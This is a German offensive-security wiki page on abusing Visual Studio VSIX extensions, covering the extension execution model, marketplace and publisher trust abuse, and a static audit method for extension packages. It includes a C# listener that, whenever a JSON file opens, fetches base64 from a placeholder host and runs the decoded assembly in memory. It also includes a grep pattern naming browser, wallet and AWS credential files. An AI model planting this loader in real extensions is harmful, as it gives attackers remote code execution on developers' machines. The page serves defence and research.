# Missbrauch von Visual Studio-VSIX-Erweiterungen

{{#include ../banners/hacktricks-training.md}}

Eine Visual Studio-Erweiterung kann routinemäßige Editoraktivitäten dazu nutzen, Code mit der Identität des angemeldeten Benutzers auszuführen. Eine bösartige VSIX, ein täuschend ähnlich auftretender Publisher oder ein kompromittiertes Erweiterungsupdate kann diesen Benutzer über normale Installationskanäle erreichen. Eine Installation mit Administratorabfrage ist ein Installationvorgang mit Zustimmung und keine automatische Rechteausweitung.<sup>[[1]](#references)</sup>

## Ausführungsmodell

Klassische VSSDK-Erweiterungen werden üblicherweise innerhalb von `devenv.exe` ausgeführt. Das neuere Modell `VisualStudio.Extensibility` führt moderne .NET-Erweiterungen hauptsächlich außerhalb des Prozesses aus: Visual Studio vermittelt Aufrufe an einen dedizierten Prozess `Microsoft.ServiceHub.Host.Extensibility`. Dies isoliert zwar die Stabilität der IDE, richtet aber **keine** Sandbox ein, die die Erweiterung von den Windows-Berechtigungen des Benutzers abschirmt. Der genaue Name der ausführbaren Datei kann einen Architekturzusatz enthalten, etwa `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Auslösen durch gewöhnliche Editoraktivitäten

Anstatt nur einen auffälligen Menübefehl bereitzustellen, kann eine Erweiterung `ITextViewOpenClosedListener` implementieren. Der Callback `TextViewOpenedAsync` wird für passende Dokumente aufgerufen, während `TextViewExtensionConfiguration.AppliesTo` die Aktivierung auf einen gängigen Typ wie JSON beschränken kann. Ein echter Formatter oder Linter kann weiterhin seine beworbene Funktion ausführen, während beim Öffnen einer Datei zusätzlich eine zweite Aktion als Nebeneffekt ausgelöst wird.<sup>[[1]](#references)[[3]](#references)</sup>

Das folgende verkürzte Muster zeigt die wichtigen Ausführungspunkte; der legitime Formatter und die Fehlerbehandlung wurden der Übersichtlichkeit halber weggelassen.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Ereignisgesteuerter In-Memory-Loader für verwaltete Assemblys</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Diese Chain lädt Base64-Text herunter, decodiert ihn zu Assembly-Bytes, lädt ihn über einen `MemoryStream` in einen sammelbaren `AssemblyLoadContext`, ruft den reflektierten `EntryPoint` mit entweder keinen Parametern oder einem `string[]` auf, wartet asynchrone Einstiegspunkte ab und entlädt den Kontext. Die zweite Stufe wird nicht auf die Festplatte geschrieben, obwohl das VSIX und die primäre Erweiterungs-DLL Artefakte auf der Festplatte bleiben. Base64 bietet weder Authentizität noch Vertraulichkeit; bei Verwendung von HTTP kann außerdem ein Angreifer auf dem Übertragungsweg die Antwort ersetzen.<sup>[[1]](#references)</sup>

Zu den operativen Varianten gehören das Unterdrücken aller Ausnahmen, damit die beworbene Funktion bei Fehlern während des Stagings weiterläuft, oder die Verwendung von `ITextViewChangedListener`, um die Ausführung nach Bearbeitungen auszulösen. Code wird im Erweiterungshost ausgeführt und kann die für diesen Benutzer verfügbaren verwalteten APIs, P/Invoke, Dateien, Zugangsdaten und Kindprozesse nutzen.<sup>[[1]](#references)</sup>

Eine verwandte, editorspezifische Ausführungsfläche, die auf dem automatischen Laden nativer Plugins basiert, wird hier beschrieben:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Missbrauch des Vertrauens in Marketplace und Bereitstellung

Ein VSIX kann als direkt freigegebene oder durch Phishing verbreitete Datei, aus dem Web Marketplace oder über den integrierten Marketplace-Browser von Visual Studio bezogen werden. Eine Publisher-Registrierung, die hauptsächlich Einzigartigkeit und eine Liste reservierter Wörter durchsetzt, kann visuell täuschende Publisher-Identitäten zulassen. Noch effektiver ist es, einen bereits vertrauenswürdigen Publisher oder eine Erweiterung zu kompromittieren, da dadurch eine installierte Nutzerbasis übernommen wird. Bei der Marketplace-Installation wird Visual Studio Installer aufgerufen und das heruntergeladene VSIX vorübergehend unter `%LOCALAPPDATA%\Temp` abgelegt. `payload.vsix` wird auch legitimerweise verwendet, daher ist der Dateiname allein kein Indikator.<sup>[[1]](#references)</sup>

MDSec konnte kein Visual-Studio-URL-Protokoll ermitteln, das eine Erweiterung direkt installiert. Ein Operator muss weiterhin den Benutzer dazu bringen, das VSIX zu installieren oder ihm zu vertrauen, oder den Verteilungspfad einer bestehenden Erweiterung kompromittieren. Ein `AllUsers`-Paket wird im Installationsordner von Visual Studio installiert und kann eine Erhöhung der Berechtigungen anfordern. Dies ist jedoch ein normales, genehmigtes Installationsverhalten und kein automatischer Weg zu Administrator- oder SYSTEM-Rechten.<sup>[[1]](#references)[[4]](#references)</sup>

### Statische Audits in großem Maßstab

VSIX-Pakete sind üblicherweise ZIP-Container. Eine sichere Pipeline zur Prüfung von Marketplace-Paketen kann daher Pakete auflisten, sie **ohne Laden des Erweiterungscodes** entpacken, die Manifeste parsen, ausführbare Oberflächen identifizieren und verwaltete Assemblies mit `ilspycmd` dekompilieren. Nach dem Ausschluss gängiger gebündelter Abhängigkeiten sollten Erweiterungs-eigene Assemblies priorisiert und Zeichenfolgen für Zugangsdaten-Speicher mit Verhaltensmustern wie Datei lesen plus Netzwerk senden, kodieren plus senden, herunterladen plus ausführen, Zugangsdaten-Manager plus Netzwerkzugriff oder Screenshot plus senden abgeglichen werden.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventarisiere außerdem native DLLs, MSBuild targets, Skripte, T4-Vorlagen und Installer-Payloads, statt davon auszugehen, dass jede Ausführungsfläche aus Managed Code besteht. Vergleiche verdächtiges Verhalten mit dem im Manifest angegebenen Zweck; Telemetrie und legitime Updater können Exfiltration oder Staging ähneln. Eine ausschließlich statische Prüfung übersieht gepackten, verschleierten, dynamisch aufgelösten und ruhenden Code. Wer nur die neueste Version prüft, übersieht außerdem möglicherweise schädliche frühere Releases.<sup>[[1]](#references)</sup>

VS Code verwendet einen anderen Extension Host und ein anderes Manifest. Informationen zu einem beschreibbaren Share, der eine automatisierte Installation von VS Code-Erweiterungen ermöglicht, findest du unter [Ausführung über einen VS Code-Erweiterungs-Drop-Share](vscode-extension-abuse.md).

Ein separater Project-Load-Angriff kann ein schädliches [MSBuild-`GetFrameworkPaths`-Target](visual-studio-project-msbuild-execution.md) ausführen, ohne ein VSIX zu installieren.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio-Erweiterungen erneut betrachtet](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Über VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Aufbau eines VSIX-Pakets](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd-.NET-Tool](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder-Tunnel-Kampagne zielt auf irakische Infrastruktur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
